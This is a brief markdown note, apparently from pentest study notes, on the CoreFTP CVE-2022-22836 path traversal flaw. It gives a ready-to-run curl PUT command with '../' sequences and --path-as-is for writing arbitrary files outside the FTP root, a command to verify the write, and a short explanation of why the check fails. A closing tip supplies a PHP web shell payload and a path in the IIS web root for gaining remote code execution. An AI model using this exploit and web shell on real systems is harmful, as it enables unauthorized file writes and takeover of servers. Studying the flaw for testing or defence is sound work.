# CoreFTP CVE-2022-22836 — Path Traversal + Arbitrary File Write

CoreFTP before build 727. Authenticated. HTTP PUT request misprocessed → directory traversal → write files outside the FTP root.

Single curl command — PUT request with path traversal sequences and content to write:

```bash
curl -k -X PUT -H "Host: <TARGET>" --basic -u <USER>:<PASS> --data-binary "<CONTENT>" --path-as-is https://<TARGET>/../../../../../../<OUTFILE>
```

`--path-as-is` prevents curl from normalizing the `../` sequences — required for the traversal to work.

Verify the write landed:

```cmd
type C:\<OUTFILE>
```

---

## Attack Flow (Source → Process → Privileges → Destination)

Phase 1 — Directory Traversal: user-supplied `../` path bypasses folder restriction because the application only checks whether the user is authorized to a specific folder, not whether the path escapes it.

Phase 2 — Arbitrary File Write: once outside the restricted path, PUT request writes attacker-controlled content to attacker-chosen filename with no further restriction check.

Combined result: authenticated write to any location the service account can reach on the filesystem. If the FTP service runs with elevated privileges or the web root is reachable from the FTP path → potential webshell drop → RCE.

> [!tip] Any path traversal + file write on a web server → try writing a webshell to the web root. `--data-binary "<?php system($_GET['cmd']); ?>"` to `../../inetpub/wwwroot/shell.php`.